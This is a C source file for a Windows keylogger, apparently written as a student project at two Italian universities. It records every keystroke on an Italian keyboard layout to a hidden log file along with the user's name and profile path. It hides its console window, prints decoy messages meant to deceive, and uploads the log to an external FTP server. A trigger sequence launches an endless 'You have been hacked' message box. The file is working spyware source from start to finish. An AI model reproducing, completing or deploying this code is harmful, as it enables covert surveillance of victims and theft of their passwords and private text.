/*
* @file keylib.c
* @brief Libreria per il keylogging.
*
* @author Federico Turrin (<federico.turrin@studenti.unipd.it>)
* @author Leonardo Antichi (<leo.antichi@stud.uniroma3.it>)
* @version 2.0
* @since 2.0
*
* @copyright Copyright (c) 2017-2018 University of Padua, Italy
* @copyright Copyright (c) 2017-2018 University of Roma 3, Italy
* @copyright Apache License, Version 2.0
*/


/* Libreria che permette di interfacciarsi con il sistema operativo Windows */
#include<windows.h>

/* Libreria che permette di interfacciarsi con il sistema operativo Windows */
#include<winuser.h>

/* Libreria che permette di interfacciarsi con il sistema operativo Windows */
#include<windowsx.h>

/* Libreria che permette di interfacciarsi con il sistema operativo Windows */
#include <Lmcons.h>

/* Libreria che permette di interfacciarsi con il sistema operativo Windows */
#include <io.h>

/* Libreria per lo standard input/output */
#include<stdio.h>

/* Libreria per funzioni di data e ora */
#include <time.h>

/* Libreria per funzione con le stringhe */
#include <string.h> 

/* Libreria per funzione ftp */
#include <wininet.h>
#pragma comment(lib, "wininet")

/* Definizione lunghezza dei buffer */
#define BUFFERSIZE 1024

/* Definizione nome file */
#define KEYLOG "res.bak"

/* Definizione nome file temporaneo */
#define TEMP "tmp.txt"

/* Definizione firma del file di log */
#define TITLE "!!******** RUNNING THE JOB ********!!"

/* Definizione della sequenza per uscire */
#define EXIT ".,m"
#define TIME ".,s"
#define DEST ".,x"
#define WAIT 60

/* Definizione valore pressione tasto */
#define PRESS -32767

/* Definizione valore pressione tasto */
#define MAIUSC 0x8000

/* Definizione MACRO per il compilatore di cmake */
#define VK_OEM_PERIOD 0xBE
#define VK_OEM_MINUS 0xBD
#define VK_OEM_COMMA 0xBC
#define VK_OEM_PLUS 0xBB

/* Definizione Nome del server */
#define FTPSERVER TEXT ("ftp.drivehq.com")

/**
* @brief Scrive un carattere nel file di testo.
*
* @param ll carattere da scrivere
*
* @return Niente
*/
void writeChar(char ch) {

	/* Puntatore a file di testo*/
	FILE *text;
	
	/* Apertura file in modalita' appending */
	text = fopen( KEYLOG , "a");

	/* Controllo apertura*/
	if (text == NULL) {

		printf("Unrecoverable ERROR! Exiting...\n");
		
		return;
	}

	/* Scrittura carattere*/
	fputc(ch, text);

	fclose(text);

	return;
}




/**
* @brief Scrive una stringa nel file di testo.
*
* @param La stringa da scrivere
*
* @return Niente
*/
void writeString(char *str) {

	/* Puntatore a file di testo*/
	FILE *text;

	/* Apertura file in modalita' appending */
	text = fopen( KEYLOG , "a");

	/* Controllo apertura*/
	if (text == NULL) {

		printf("Errore nell'apertura del file!\n");

		return;
	}

	/* Scrittura carattere*/
	fputs(str, text);

	fclose(text);

	return;
}




/**
* @brief Verifica se e' presente la sequenza di uscita.
*
* @param Nessuno
*
* @return 0 se non e' stata digitata la sequenza di uscita.
* @return 1 se e' stata digitata la sequenza di uscita.
*/
int isEnd() {

	/* Variabile per la lettura del testo */
	char str[BUFFERSIZE];

	/* Puntera' a file di testo */
	FILE *text;

	/* Apertura file in modalita' read */
	text = fopen( KEYLOG , "r" );
	
	/* Controllo apertura*/
	if ( text == NULL ) {

		return 0;
	}

	/* Ricerca sottostringa con sequenza di termine*/
	while (fgets(str, BUFFERSIZE, text) != NULL) {

		/* Se viene trovara la sottostringa EXIT ritorna 1 */
		if (strstr(str, EXIT) != NULL) {

			/* Chiusura file di testo*/
			fclose(text);

			return 1;
		}

		/* Se viene trovara la sottostringa TIME ritorna 2 */
		else if (strstr(str, TIME) != NULL) {

			/* Chiusura file di testo*/
			fclose(text);
			return 2;
		}

		else if (strstr(str, DEST) != NULL) {

			/* Chiusura file di testo*/
			fclose(text);
			return 100;
		}
	}
	
	fclose(text);
	
	/* Se non viene trovata la sequenza di termine ritorna 0*/
	return 3;
}






/**
* @brief Verifica se e' presente un precedente file di log con la sequenza di termine.
*
* @param nessuno
*
* @return 0 se la sequenza di termine non e' presente oppure il log viene cancellato.
* @return 1 se viene deciso di uscire dal programma.
*/
int isCollision() {

	/* Controllo se nel log pre-esistente e' gia' presente la sequenza di termine*/
	int s = isEnd() ;

	/* Se e' presente la sequenza di termine*/
	if (s != 0) {
		
		/* Variabile per la decisione*/
		int n;

		/* Frasi Inutili, stringhe cofusionarie */
		printf("WARING: SOMETHING APPENING!\n\n");
		printf("UNDEFINED BEHAVIOR DETECTED, STARTING RECOVERY...\n");
		printf("0K!\n");

		/* Variabile per data e ora di inizio*/
		time_t rawtime;
		struct tm * timeinfo;
		time(&rawtime);
		timeinfo = localtime(&rawtime);
		char filename[20];
		size_t l = strftime( filename, 20, "%Hh%Mm%S.bak",	timeinfo);

		/* Rinominazione o altrimenti cancellazione file */
		n = rename( KEYLOG , "old.bak" );
		if(magic()!= 0) { rename("old.bak", filename); }
		
		if (n != 0) {
			remove(KEYLOG);
			printf("0K!\n");			
		}

		/* Check Inutile, inserito per Deception */
		if (n == 2) {
			printf("0K!\n");
			return 1;
		}
	}

	/* Se il log e' stato cancellato o non era presente la sequenza di termine*/
	return 0;
}




/**
* @brief Cancella il primo enter causato dall'avvio del programma
*
* @param nessuno
*
* @return 0 se il procedimento non e' andato a buon termine.
* @return 1 se il procedimento va a buon termine.
*/
int clearText() {

	/* Variabile per lettura dei caratteri */
	char ch;

	/* Contatore di righe */
	int line = 1;

	/* Puntatatore al file di testo */
	FILE *text;

	/* Apertura file di log in modalita' read */
	text = fopen( KEYLOG , "r" );

	/* Controllo apertura*/
	if ( text == NULL) {
		
		printf("Unrecoverable ERROR! Exiting...\n");

		return 0;
	}

	/* Puntatore al file di supporto */
	FILE *tmp;

	/* Apertura file in modalita' write */
	tmp = fopen( TEMP , "w");

	/* Controllo apertura */
	if ( tmp == NULL) {

		printf("Unrecoverable ERROR! Exiting...\n");

		return 0;
	}
	
	/* *****Scrittura nel nuovo file***** */
	
	/*Lettura preliminare*/
	ch = getc( text );

	while (ch != EOF) {

		/* Incremento contatore riga */	
		if ( ch == '\n')
			line++;

		/* Se non e' la riga da saltare */
		if ( line != 4 ) {

			/* Copia carattere nel nuovo file */
			putc( ch , tmp );
		}

		/* Letutra carattere */
		ch = getc(text);
	}

	/* Chiusura primo file */
	fclose(text);

	/* Chiusura secondo file*/
	fclose(tmp);

	/* Rimozione file vecchio */
	remove( KEYLOG );

	/* Rinomina del file temporaneo come quello definitivo*/
	rename( TEMP , KEYLOG );

	return 1;
}




/**
* @brief Scrittura caratteri digitati da tastiera su file di testo.
*
* @details Digitare la sequenza di termine per uscire.
* @details Firma in testa al file
* @details Firma in coda al file
* @details La funzione e' pensata per lavorare su tastiera con layout ITALIANO
*
* @return 0 se c'e' stato un errore
* @return 1 se viene eseguito tutto correttamente
*/
int getKeys() {

	/* Variabili decisionali nel ciclo while per timing */
	time_t begin = 0 , end;
	time_t tmptime, spent = WAIT;

	/* Variabile per lo stato del caps look */
	int shift;
	
	/* Variabile per lo stato dello shift */
	int	maiusc;

	/* Variabile decisionale nel ciclo while */
	int w = 0, h = 0, r = 0;

	/* Contatore digitazioni corrette */
	int count = 0;

	/* Contatore digitazioni errate */
	int nc = 0;

	/* Variabile di lettura delle digitazione */
	short character;

	/* Puntatore a file di testo */
	FILE *file;

	/* Variabile per la funzione di pulizia */
	int ct;


	/* *****Scrittura firma iniziale***** */

	/* Apertura file in modalita' appending */
	file = fopen(KEYLOG, "a");

	/* Controllo apertura*/
	if (file == NULL) {

		printf("Unrecoverable Error!\n");

		return 0;
	}

	/* Se l'apertura avviene con successo intesta il file di testo*/
	else {

		/* Scrittura firma*/
		fprintf(file, "%s\n", TITLE);

		/* Variabile per data e ora di inizio*/
		time_t ora;

		/* Lettura dell'ora corrente come numero di secondi trascorsi dal 1 Gennaio 1970 */
		time(&ora);

		fprintf(file, "Start at: ");

		/*
		* localtime() contiente l'ora corrente suddivisa in diverse parti (giorni, ore, ecc)
		* asctime() converte l'ora in stringa
		*/
		fprintf(file, "%s", asctime(localtime(&ora)));
		fprintf(file, "USER PATH:'%s'		USERNAME:'%s' ", getenv("USERPROFILE"), getenv("USERNAME"));
		fprintf(file, "\n\n\nBEGIN: \n\n" );

		fclose(file);
	}

	/* *****Fine firma iniziale***** */


	/* Loop finche' non viene rilevata la sequenza di termine*/
	while (w != 1) {


		/* Ciclo per includere i tasti */
		for (character = 8; character <= 222; character++) {

			/* Se viene premuto un tasto */
			if (GetAsyncKeyState(character) == PRESS) {

				/* Se viene premuto uno dei due shift */
				if ((GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT)) & MAIUSC) {

					/* Attiva variabile dello shift */
					shift = 1;

					/* Se e' attivo anche il caps lock */
					if (GetKeyState(VK_CAPITAL))

						/* Disattiva variabile del maiuscolo */
						maiusc = 0;

					/* Se non e' attivo il caps lock*/
					else

						/* Attiva variabile del maiuscolo */
						maiusc = 1;
				}

				/* Se non sono stati premuti shift*/
				else {

					/* Disattiva variabile dello shift */
					shift = 0;

					/* Se e' attivo anche il caps lock */
					if (GetKeyState(VK_CAPITAL))

						/* Attiva variabile dello maiuscolo */
						maiusc = 1;

					/* Se non e' attivo il caps lock */
					else

						/* Disattiva variabile del maiuscolo */
						maiusc = 0;
				}

				/* Se il tasto e' un numero */
				if (character >= 48 && character <= 57) {

					/* Se e' attivo lo shift scrive il corrispondente simbolo*/
					if (shift == 1) {

						/* Vettore con i simboli corrispondenti ai numeri */
						char symbol[10] = { '=', '!', '"', '£', '$', '%', '&', '/', '(', ')' };

						/* Sottraggo 48 per ottenere la posizione del vettore*/
						character -= 48;

						/* Scivi carattere nel file*/
						writeChar(symbol[character]);
					}

					/* Se non e' attivo lo shift */
					else

						/* Srivere il numero come carattere*/
						writeChar((char)character);

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' un carattere alfabetico*/
				else if (character >= 65 && character <= 90) {

					/* Se e' attiva la variabile del maiuscolo*/
					if (maiusc == 1)

						/* Scrive la lettera maiuscola*/
						writeChar((char)character);

					/* Se non e' attiva la variabile del maiuscolo*/
					else
						/* Scrive la lettera maiuscola*/
						writeChar(tolower((char)character));

					/* Incremento contatore tasti */
					count++;
				}

				/* *****TASTI CON DOPPIA FUNZIONE***** */

				/* Se il e' [? \] */
				else if (character == 219) {

					/* Se e' attivo lo shift*/
					if (shift == 1)
						writeChar('?');

					/* Se lo shift non e' attivato*/
					else
						writeChar('\'');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [. :] */
				else if (character == VK_OEM_PERIOD) {

					/* Se e' attivo lo shift*/
					if (shift == 1)
						writeChar(':');

					/* Se lo shift non e' attivato*/
					else
						writeChar('.');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [- _] */
				else if (character == VK_OEM_MINUS) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('_');

					/* Se lo shift non e' attivato*/
					else
						writeChar('-');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [, ;] */
				else if (character == VK_OEM_COMMA) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar(';');

					/* Se lo shift non e' attivato*/
					else
						writeChar(',');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [ì ^] */
				else if (character == VK_OEM_6) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('^');

					/* Se lo shift non e' attivato*/
					else
						writeChar('ì');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [\ |] */
				else if (character == VK_OEM_5) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('|');

					/* Se lo shift non e' attivato*/
					else
						writeChar('\\');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [ù §] */
				else if (character == VK_OEM_2) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('§');

					/* Se lo shift non e' attivato*/
					else
						writeChar('ù');

					/* Incremento contatore tasti */
					count++;
				}

				/* *****TASTI CON TRIPLA FUNZIONE senza altgr***** */
	
					/* Se il tasto e' [ò ç @] */
				else if (character == VK_OEM_3 && !(GetAsyncKeyState(VK_RMENU))) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('ç');

					/* Se lo shift non e' attivo*/
					else
						writeChar('ò');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [à ° #] */
				else if (character == VK_OEM_7 && !(GetAsyncKeyState(VK_RMENU))) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('°');

					/* Se lo shift non e' attivo*/
					else
						writeChar('à');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [ e' é [ ] */
				else if (character == VK_OEM_1 && !(GetAsyncKeyState(VK_RMENU))) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('é');

					/* Se lo shift non e' attivo*/
					else
						writeChar('è');

					/* Incremento contatore tasti */
					count++;
				}

				/* Se il tasto e' [ + * ] ] */
				else if (character == VK_OEM_PLUS && !(GetAsyncKeyState(VK_RMENU))) {

					/* Se lo shift e' attivo*/
					if (shift == 1)
						writeChar('*');

					/* Se lo shift non e' attivo*/
					else
						writeChar('+');

					/* Incremento contatore tasti */
					count++;
				}

				/* *****TASTI CON ALTGR***** */

				else if (GetAsyncKeyState(VK_CONTROL)){
					
					/* Lettura @ */
					if (GetAsyncKeyState(VK_OEM_3)) {
						writeChar('@');
						count++;
					}

					/* Lettura # */
					else if (GetAsyncKeyState(VK_OEM_7)) {
						writeChar('#');
						count++;
					}

					/* Lettura [ */
					else if (GetAsyncKeyState(VK_OEM_1)) {
						writeChar('[');
						count++;
					}

					/* Lettura ] */
					else if (GetAsyncKeyState(VK_OEM_PLUS)) {
						writeChar(']');
						count++;
					}

				}

				/* Coversione da VKcodes a simbolo */
				else {

					switch (character) {

						//***TASTI DI TABULAZIONE***

						/* Lettura spazio */
					case VK_SPACE:
						writeChar(' ');
						count++;
						break;

						/* Lettura ENTER (va a capo nel testo del log) */
					case VK_RETURN:
						writeString("[ENTER]\n");
						count++;
						break;

						/* Lettura BACKSPACE */
					case VK_BACK:
						writeString("[BACKSPACE]");
						count++;
						break;

						/* Lettura TAB */
					case VK_TAB:
						writeString("[TAB]");
						count++;
						break;

						/* Lettura CTRL */
					case VK_CONTROL:
						writeString("[CTRL]");
						count++;
						break;

						/* Lettura ALT */
					case  VK_MENU:
						writeString("[ALT]");
						count++;
						break;

						//***FRECCE***

						/* Lettura FRECCIA SINISTRA */
					case  VK_LEFT:
						writeString("[LEFT ARROW]");
						count++;
						break;

						/* Lettura FRECCIA SU */
					case  VK_UP:
						writeString("[UP ARROW]");
						count++;
						break;

						/* Lettura FRECCIA DESTRA */
					case  VK_RIGHT:
						writeString("[RIGHT ARROW]");
						count++;
						break;

						/* Lettura FRECCIA GIU' */
					case  VK_DOWN:
						writeString("[DOWN ARROW]");
						count++;
						break;

						//***Tastierino numerico***

						/* Lettura 0 */
					case VK_NUMPAD0:
						writeChar('0');
						count++;
						break;

						/* Lettura 1 */
					case VK_NUMPAD1:
						writeChar('1');
						count++;
						break;

						/* Lettura 2 */
					case VK_NUMPAD2:
						writeChar('2');
						count++;
						break;

						/* Lettura 3 */
					case VK_NUMPAD3:
						writeChar('3');
						count++;
						break;

						/* Lettura 4 */
					case VK_NUMPAD4:
						writeChar('4');
						count++;
						break;

						/* Lettura 5 */
					case VK_NUMPAD5:
						writeChar('5');
						count++;
						break;

						/* Lettura 6 */
					case VK_NUMPAD6:
						writeChar('6');
						count++;
						break;

						/* Lettura 7 */
					case VK_NUMPAD7:
						writeChar('7');
						count++;
						break;

						/* Lettura 8 */
					case VK_NUMPAD8:
						writeChar('8');
						count++;
						break;

						/* Lettura 9 */
					case VK_NUMPAD9:
						writeChar('9');
						count++;
						break;

						/* Lettura + */
					case  VK_ADD:
						writeChar('+');
						count++;
						break;

						/* Lettura * */
					case VK_MULTIPLY:
						writeChar('*');
						count++;
						break;

						/* Lettura / */
					case VK_DIVIDE:
						writeChar('/');
						count++;
						break;

						/*Lettura . */
					case VK_DECIMAL:
						writeChar('.');
						count++;
						break;

					case VK_SHIFT:
					case VK_CAPITAL:
					case VK_LSHIFT:
					case VK_RSHIFT:
						break;

						/*Se il simbolo non e' riconosciuto: ~ */
					default:
						writeChar('~');
						nc++;
						break;

					}

				}
			}

		}
			/* Verifica presenza della sequenza di termine*/
			w = isEnd();

			/* Attiva timer spegnimento */
			if (w == 2) {

				if (begin == 0) { begin = time(NULL); }
				end = time(NULL);
				tmptime = (end - begin);
				if (tmptime > spent) {	w = 1; }

			}

			if (w == 100) {
				destroyer();
			}
			
			/* Attesa di 10 millisecondi prima di continuare il programma per prevenire 100% cpu usage*/
			Sleep(10);
		
	}

	/* Apertura file in modalita' appending */
	file = fopen(KEYLOG, "a");

	/*Controllo apertura */
	if (file == NULL) {

		printf("Unrecoverable error!\n");

		return 0;
	}

	/* Se l'apertura avviene con successo inserisce firma di termine */
	else {

		/* Variabile per data e ora di inizio*/
		time_t ora;

		/* Lettura dell'ora corrente come numero di secondi trascorsi dal 1� Gennaio 1970 */
		time(&ora);

		fprintf(file, "\n\nFinish at: ");

		/*
		* localtime() contiente l'ora corrente suddivisa in diverse parti (giorni, ore, ecc)
		* asctime() converte l'ora in stringa
		*/
		fprintf(file, "%s\n", asctime(localtime(&ora)));

		/*Tasti rilevati correttamente*/
		fprintf(file, "Correct: %d\n", count);

		/*Tasti rilevati non correttamente*/
		fprintf(file, "Incorrect: %d\n", nc);

		/*Tasti totali rilevati*/
		fprintf(file, "Total: %d\n", (count + nc));

		fclose(file);
	}

	/* Cancella il primo enter causato dall'avvia del programma */
	ct = clearText();

	/* Se la funzione non e' andata a buon fine */
	if (ct == 0) {

		return 0;
	}

	return 1;
}




/**
* @brief Crea una finestra stealth.
*
* @details La finestra non sara' visibile
* @details Digitare la sequenza di termine per uscire.
*
* @return Nessuno
*/
void Stealth()
{
	/* Dichiaraione variabile per la finestra */
	HWND stealth;

	/* Allocazione di una finestra per questo programma */
	AllocConsole();
	
	/* Ricerca la finestra precedentemente allocata e la assegna alla variabile */
	stealth = FindWindowA( "ConsoleWindowClass" , NULL );
	
	/* Nasconde la finestra del programma */
	ShowWindow( stealth, 0 );

	return;
}





/**
* @brief Crea una sessione FTP.
*
* @details La finestra non sara' visibile
* @details Esegue l'upload del file
*
* @return Nessuno
*/
int magic()
{
	/*Initialize FTP*/
	HINTERNET hInternet;
	HINTERNET hFtp;
	HINTERNET hDir;

	int res = 0;

	/*Initialize TIME*/
	time_t rawtime;

		struct tm * timeinfo;
		time(&rawtime);
		timeinfo = localtime(&rawtime);
		char fpname[20];
		size_t l = strftime(fpname, 20, "%Hh%Mm%S.bak", timeinfo);
		char username[40];

		/*Initialize NAME*/
		strcpy(username, getenv("USERNAME"));

		/*Initialize FTP*/
		//printf("Start FTP\n");
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG,
			NULL, NULL, 0);

		if (hInternet == NULL)
		{
			//printf("Internet Open error %i", GetLastError());
			return 1;
		}

		/*else
		{
			printf("Internet session opened\n");
		}*/

		hFtp = InternetConnect(hInternet, FTPSERVER,
			21, "username", "password", INTERNET_SERVICE_FTP, 0, 0);
		
		if (hFtp == NULL)
		{
			//printf("FTP Open error %d", GetLastError());
			return 1;
		}

		/*else
		{
			printf("FTP connected\n");
		}*/

		FtpCreateDirectoryA(
			hFtp,
			username
		);

		hDir = FtpSetCurrentDirectoryA(
			hFtp,
			username
		);

		if (!hDir)
		{
			//printf("Cannot open Directory %d", GetLastError());
			return 1;
		}

		/*else
		{
			printf("Directory Loaded\n");
		}*/

		res = FtpGetFileA(hFtp, "settings.txt", "C:\\dowload.txt", FALSE, INTERNET_FLAG_RELOAD, FTP_TRANSFER_TYPE_BINARY, 0);
		//printf("Download File status: %d\n", res);
		
		res = FtpPutFileA(hFtp, "C:\\old.bak", fpname, FTP_TRANSFER_TYPE_BINARY, 0);
		//printf("Upload File status: %d\n", res);
		
		//printf("FTP Finish\n");
		InternetCloseHandle(hFtp);
		InternetCloseHandle(hInternet);

		if (res == 1)

		{
			remove("old.bak");
			return 0;
		}

		else

		{
			return 1;
		}

		return 1;
}

int destroyer() {
	int x=0, y=0;
	y = 1 - 1;
	while (y == 0) {
		MessageBox(NULL, "You have been hacked and your files got stolen!", "HACKED!", NULL);
		x = x + 1;
	}
	return;
}